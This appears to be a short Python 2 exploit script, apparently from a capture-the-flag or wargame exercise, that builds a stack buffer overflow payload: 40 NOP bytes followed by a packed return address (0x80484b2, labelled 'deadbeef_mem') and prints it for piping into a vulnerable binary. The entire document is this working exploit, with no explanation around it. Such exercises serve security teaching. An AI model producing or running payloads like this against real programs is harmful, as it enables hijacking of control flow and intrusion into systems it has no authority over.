from struct import *

p = lambda x : pack("<L", x)

deadbeef_mem = 0x80484b2

payload = ""
payload += "\x90"*(56-16)
payload += p(deadbeef_mem)

print payload